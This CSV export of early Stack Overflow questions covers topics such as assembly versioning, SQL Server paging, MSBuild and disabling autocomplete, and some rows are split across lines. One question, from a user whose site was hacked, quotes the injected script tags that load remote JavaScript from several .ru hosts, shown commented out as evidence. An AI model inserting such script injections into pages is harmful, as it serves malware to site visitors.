Id,OwnerUserId,CreationDate,ClosedDate,Score,Title,Body
<p>I'm also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory. </p>,,,,,,
,,,,,,
<p>I would like to be able to display a version number in the form of 1.1.38 so when a user finds a problem I can log the version they are using as well as tell them to upgrade if they have an old release.</p>,,,,,,
,,,,,,
<p>A short explanation of how the versioning works would also be appreciated. When does the build and revision number get incremented?</p>,,,,,,
810,233,2008-08-03T20:35:01Z,,9,Visual Studio Setup Project - Per User Registry Settings,<p>I'm trying to maintain a Setup Project in <code>Visual Studio 2003</code> (yes; it's a legacy application). The problem we have at the moment is that we need to write registry entries to <code>HKCU</code> for every user on the computer. They need to be in the <code>HKCU</code> rather than <code>HKLM</code> because they are the default user settings; and they do change per user. My feeling is that</p> <ol> <li>This isn't possible</li> <li>This isn't something the installer should be doing; but something the application should be doing (after all what happens when a user profile is created after the install?).</li> </ol> <p>With that in mind; I still want to change as little as possible in the application; so my question is; <strong>is it possible to add registry entries for every user in a <code>Visual Studio 2003</code> setup project?</strong> </p> <p>And; at the moment the project lists five registry root keys (<code>HKEY_CLASSES_ROOT; HKEY_CURRENT_USER</code>; <code>HKEY_LOCAL_MACHINE</code>; <code>HKEY_USERS</code>; and User/Machine Hive). I don't really know anything about the Users root key; and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.</p>
930,245,2008-08-04T00:47:25Z,,28,How do I connect to a database and loop over a recordset in C#?,<p>What's the simplest way to connect and query a database for a set of records in C#?</p>
1010,67,2008-08-04T03:59:42Z,,14,How to get the value of built; encoded ViewState?,"<p>I need to grab the base64-encoded representation of the ViewState. Obviously this would not be available until fairly late in the request lifecycle; which is OK.</p> <p>For example; if the output of the page includes:</p> <pre><code>&lt;input type=""hidden"" name=""__VIEWSTATE"" id=""__VIEWSTATE"" value=""/wEPDwUJODU0Njc5MD...=="" /&gt; </code></pre> <p>I need a way on the server side to get the value <code>""/wEPDwUJODU0Njc5MD...==""</code></p> <p>To clarify; I need this value when the page is being rendered; not on PostBack. e.g. I need to know the ViewState value that is being <em>sent</em> to the client; not the ViewState I'm getting back from them.</p>"
1040,254,2008-08-04T05:45:22Z,,42,How do I delete a file which is locked by another process in C#?,<p>I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles; although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using <code>File.Delete()</code>.</p>
1070,236,2008-08-04T07:34:44Z,,17,Process size on UNIX,<p>What is the correct way to get the process size on <code>Solaris; HP-UX</code> and <code>AIX</code>? Should we use <code>top</code> or <code>ps -o vsz</code> or something else?</p>
1160,120,2008-08-04T11:37:24Z,,36,Use SVN Revision to label build in CCNET,<p>I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.</p>
,,,,,,
<p>I would like to use the latest revision number to generate AssemblyInfo.cs while compiling.,,,,,,
How can I retrieve the latest revision from subversion and use the value in CCNET?</p>,,,,,,
,,,,,,
<p>Edit: I'm not using NAnt - only MSBuild.</p>,,,,,,
1180,281,2008-08-04T12:22:07Z,,17,How to make subdomain user accounts in a webapp,<p>I am looking to allow users to control of subdomain of an app I am toying with; much like Basecamp where it is <code>customusername.seework.com</code>.</p> <p>What is required on the <code>DNS</code> end to allow these to be created dynamically and be available instantly. </p> <p>And how do you recommend dealing with this in the logic of the site? <code>Htaccess</code> rule to lookup the subdomain in the <code>DB</code>?</p>
1300,91,2008-08-04T14:55:04Z,,23,Is nAnt still supported and suitable for .net 3.5/VS2008?,"<p>I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.</p> <p>Now; CCNET refers nAnt a lot; but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also; nAnt seems a bit unsupported; with a Beta release that is almost a year old now.</p> <p>In short: I am actually quite happy with MSBuild (especially since it's the ""official"" compiler front end) and a bit uncomfortable with nAnt; but I do not want to judge prematurely.</p> <p>What would be reasons to use nAnt over MSBuild? Especially with ccnet; which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)</p>"
1390,60,2008-08-04T16:33:36Z,,18,"Is Windows Server 2008 ""Server Core"" appropriate for a SQL Server instance?","<p>I'm setting up a dedicated SQL Server 2005 box on Windows Server 2008 this week; and would like to pare it down to be as barebones as possible while still being fully functional.</p> <p>To that end; the ""Server Core"" option sounds appealing; but I'm not clear about whether or not I can run SQL Server on that SKU. Several services are addressed on the <a href=""http://www.microsoft.com/windowsserver2008/en/us/compare-core-installation.aspx"">Microsoft website</a>; but I don't see any indication about SQL Server.</p> <p>Does anyone know definitively?</p>"
1600,230,2008-08-04T21:27:53Z,,18,What is the best way to copy a database?,<p>I always create a new empty database; after that backup and restore of the existing database into it; but is this really the best way? As it seems very error prone and over complicated for me.</p>
1610,328,2008-08-04T21:37:31Z,,63,Can I logically reorder columns in a table?,"<p>If I'm adding a column to a table in Microsoft SQL Server; can I control where the column is displayed logically in queries?</p> <p>I don't want to mess with the physical layout of columns on disk; but I would like to logically group columns together when possible so that tools like SQL Server Management Studio list the contents of the table in a convenient way.</p> <p>I know that I can do this through SQL Management Studio by going into their ""design"" mode for tables and dragging the order of columns around; but I'd like to be able to do it in raw SQL so that I can perform the ordering scripted from the command line.</p>"
1760,234,2008-08-05T00:51:49Z,,51,.NET Unit Testing packages?,<p>Getting back into a bit more .NET after a few-years of not using it full-time; and wondering what the good unit testing packages are these days.</p> <p>I'm familiar with NUnit (a few years ago); and have played briefly around with IronRuby; with the goal of getting something like rspec going; but don't know much beyond that.</p> <p>I realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)</p> <p>Suggestions?</p>
1790,194,2008-08-05T01:27:34Z,,13,Federated (Synced) Subversion servers?,"<p>Is it possible to create ""federated"" Subversion servers? As in one server at location A and another at location B that sync up their local versions of the repository automatically. That way when someone at either location interacts with the repository they are accessing their respective local server and therefore has faster response times.</p>"
1970,116,2008-08-05T06:39:31Z,,10,What language do you use for PostgreSQL triggers and stored procedures?,<p>PostgreSQL is interesting in that it supports several languages for writing stored procedures. Which one do you use; and why?</p>
2120,383,2008-08-05T11:49:11Z,,77,Convert HashBytes to VarChar,"<p>I want to get the MD5 Hash of a string value in SQL Server 2005. I do this with the following command:</p> <pre><code>SELECT HashBytes('MD5'; 'HelloWorld') </code></pre> <p>However; this returns a VarBinary instead of a VarChar value. If I attempt to convert <code>0x68E109F0F40CA72A15E05CC22786F8E6</code> into a VarChar I get <code>hÃÂ¡ ÃÂ°ÃÂ´ÃÂ§*ÃÂ \ÃÂ'Ã¢ÂÂ ÃÂ¸ÃÂ¦</code> instead of <code>68E109F0F40CA72A15E05CC22786F8E6</code>.</p> <p>Is there any SQL-based solution?</p> <p><strong><a href=""http://stackoverflow.com/questions/2120/#2382"">Yes</a></strong></p>"
2250,383,2008-08-05T13:07:40Z,,83,Datatable vs Dataset,<p>I currently use a DataTable to get results from a database which I can use in my code.</p> <p>However; many example on the web show using a DataSet instead and accessing the table(s) through the collections method.</p> <p>Is there any advantage; performance wise or otherwise; of using DataSets or DataTables as a storage method for SQL results?</p>
2300,193,2008-08-05T13:30:46Z,,10,How do I traverse a collection in classic ASP?,<P>I want to be able to do:</P><PRE><CODE>For Each thing In things
End For,,,,,,
</CODE></PRE>,,,,,,
<P>CLASSIC ASP - NOT .NET!</P>,,,,,,
2530,307,2008-08-05T16:22:32Z,,1614,How do you disable browser Autocomplete on web form field / input tag?,<p>How do you disable <code>autocomplete</code> in the major browsers for a specific <code>input</code> (or <code>form field</code>)?</p>
2540,136,2008-08-05T16:30:37Z,2014-04-03T15:36:28Z,39,Good STL-like library for C,<p>What are good libraries for C with datastructures like vectors; deques; stacks; hashmaps; treemaps; sets; etc.? Plain C; please; and platform-independent.</p>
2550,308,2008-08-05T16:39:04Z,,16,What are effective options for embedding video in an ASP.NET web site?,<p>A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page. Is this accurate; or are they other effective choices? Does the choice of ASP.NET as a platform influence this decision?</p>
2630,17,2008-08-05T18:01:32Z,2012-02-22T01:58:23Z,14,What are your favorite Powershell Cmdlets?,<p>I just found /n softwares free Powershell NetCmdlets; and after playing with them I love the functionality they bring to the command line. So it raises the question what are your favorite Cmdlets; and how do you use them?</p>
2750,435,2008-08-05T19:51:29Z,,7,Data verifications in Getter/Setter or elsewhere?,<p>I'm wondering if it's a good idea to make <strong>verifications</strong> in <strong>getters</strong> and <strong>setters</strong>; or elsewhere in the code.</p> <p>This might surprise you be when it comes to <strong>optimizations</strong> and <strong>speeding</strong> up the code; I think you should not make verifications in getters and setters; but in the code where you're <strong>updating</strong> your files or database. Am I wrong?</p>
2770,447,2008-08-05T20:05:22Z,,27,Global Exception Handling for winforms control,<p>When working on ASP.NET 1.1 projects I always used the Global.asax to catch all errors. I'm looking for a similar way to catch all exceptions in a Windows Forms user control; which ends up being a hosted IE control. What is the proper way to go about doing something like this?</p>
2780,45,2008-08-05T20:12:20Z,,12,Converting ARBG to RGB with alpha blending,<p>Let's say that we have an ARGB color:</p> <pre><code>Color argb = Color.FromARGB(127; 69; 12; 255); //Light Urple. </code></pre> <p>When this is painted on top of an existing color; the colors will blend. So when it is blended with white; the resulting color is <code>Color.FromARGB(255; 162; 133; 255);</code></p> <p>The solution should work like this:</p> <pre><code>Color blend = Color.White; Color argb = Color.FromARGB(127; 69; 12; 255); //Light Urple. Color rgb = ToRGB(argb; blend); //Same as Color.FromARGB(255; 162; 133; 255); </code></pre> <p>What is <code>ToRGB</code>'s implementation? </p>
2840,383,2008-08-05T20:57:00Z,,32,Paging SQL Server 2005 Results,<p>How do I page results in SQL Server 2005?</p> <p>I tried it in SQL Server 2000; but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?</p> <p>What I mean by paging is; for example; if I list users by their username; I want to be able to only return the first 10 records; then the next 10 records and so on.</p> <p>Any help would be much appreciated.</p>
2900,454,2008-08-05T21:45:11Z,,14,MySQL/Apache Error in PHP MySQL query,"<p>I am getting the following error:</p> <blockquote> <p>Access denied for user 'apache'@'localhost' (using password: NO)</p> </blockquote> <p>When using the following code:</p> <pre><code>&lt;?php include(""../includes/connect.php""); $query = ""SELECT * from story""; $result = mysql_query($query) or die(mysql_error()); echo ""&lt;h1&gt;Delete Story&lt;/h1&gt;""; if (mysql_num_rows($result) &gt; 0) { while($row = mysql_fetch_row($result)){ echo '&lt;b&gt;'.$row[1].'&lt;/b&gt;&lt;span align=""right""&gt;&lt;a href=""../process/delete_story.php?id='.$row[0].'""&gt;Delete&lt;/a&gt;&lt;/span&gt;'; echo '&lt;br /&gt;&lt;i&gt;'.$row[2].'&lt;/i&gt;'; } } else { echo ""No stories available.""; } ?&gt; </code></pre> <p>The connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software. If I comment out the $result = mysql_query line; then it goes through to the else statement. So; it is that line or the content in the if.</p> <p>I have been searching the net for any solutions; and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission. I have checked both. I can still perform my other queries elsewhere in the software; and I have verified that the account has the correct permissions.</p>"
2970,58,2008-08-05T23:55:25Z,2012-03-06T03:17:01Z,17,My website got hacked... What should I do?,"<p>My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all; and built the whole thing with a WYSIWYG editor.</p> <p>I popped his site open and viewed the source; and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): <a href=""http://www.98hs.ru/js.js"" rel=""nofollow"">http://www.98hs.ru/js.js</a> &lt;-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.</p> <p>So I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long; so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).</p> <p>I did a <a href=""http://whois.domaintools.com/98hs.ru"" rel=""nofollow"">whois on 98hs.ru</a> and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too; but I seriously doubt this person is the culprit. Probably just some other site that got hacked...</p> <p>I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?</p> <p>He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to <em>do</em> sftp on their site. I'm thinking his username and password got intercepted?</p> <p><strong>So; to make this more relevant to the community; what are the steps you should take/best practices you should follow to protect your website from getting hacked?</strong></p> <p>For the record; here is the line of code that ""magically"" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page; although I'm sure Jeff would guard against this):</p> <pre><code>&lt;!--script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script--&gt; </code></pre>"
3150,370,2008-08-06T07:57:50Z,,76,How to set up unit testing for Visual Studio C++,<p>I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.</p> <p>Any links or tutorials would be appreciated.</p>
3180,479,2008-08-06T08:47:45Z,2012-08-13T12:20:03Z,29,Anyone soloing using fogbugz?,<p>Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.</p>
,,,,,,
<p>I am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.</p>,,,,,,
,,,,,,
<p>(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)</p>,,,,,,
3230,370,2008-08-06T09:49:27Z,,25,How do you pack a visual studio c++ project for release?,<p>I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.</p>
,,,,,,
<p>Without doing this you get the error message that the application configuration is not correct and to reinstall. </p>,,,,,,
3260,186,2008-08-06T10:23:18Z,,46,Peak detection of measured signal,"<p>We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.</p> <p>This works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.</p> <p>My initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?</p> <hr> <p>We do use LabVIEW and I have checked the <a href=""http://forums.lavag.org/Peak-Detection-t8499.html"">LAVA forums</a> and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code. </p>"
3400,35,2008-08-06T13:52:29Z,,25,How do you get leading wildcard full-text searches to work in SQL Server?,"<p><strong>Note:</strong> I <em>am</em> using SQL's Full-text search capabilities; CONTAINS clauses and all - the * is the wildcard in full-text; % is for LIKE clauses only.</p> <p>I've read in several places now that ""leading wildcard"" searches (e.g. using ""*overflow"" to match ""stackoverflow"") is not supported in MS SQL. I'm considering using a <a href=""http://blogs.msdn.com/sqlclr/archive/2005/06/29/regex.aspx"">CLR function to add regex matching</a>; but I'm curious to see what other solutions people might have.</p> <p><strong>More Info</strong>: <a href=""http://msdn.microsoft.com/en-us/library/ms552152.aspx"">You can add the asterisk only at the end of the word or phrase.</a> - along with my empirical experience: When matching ""myvalue""; ""my*"" works; but ""(asterisk)value"" returns no match; when doing a query as simple as:</p> <pre><code>SELECT * FROM TABLENAME WHERE CONTAINS(TextColumn; '""*searchterm""'); </code></pre> <p>Thus; my need for a workaround. I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated; but this sort of match really shouldn't fail.</p>"
3470,383,2008-08-06T14:36:56Z,,12,How do I Transform Sql Columns into Rows?,<p>I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.</p> <p>I have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.</p> <pre><code>TableA Column1; Column2; Column3 </code></pre> <p>SQL Statement to ruturn</p> <pre><code>ResultA Value of Column1 Value of Column2 Value of Column3 </code></pre> <hr> <p><strong>@Kevin:</strong> I've had a google search on the topic but alot of the example where overly complex for my example; <strong>are you able to help further?</strong></p> <p>@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3</p>
3510,383,2008-08-06T14:54:52Z,,16,"What does the term ""BODMAS"" mean?",<p>What is BODMAS and why is it useful in programming?</p>
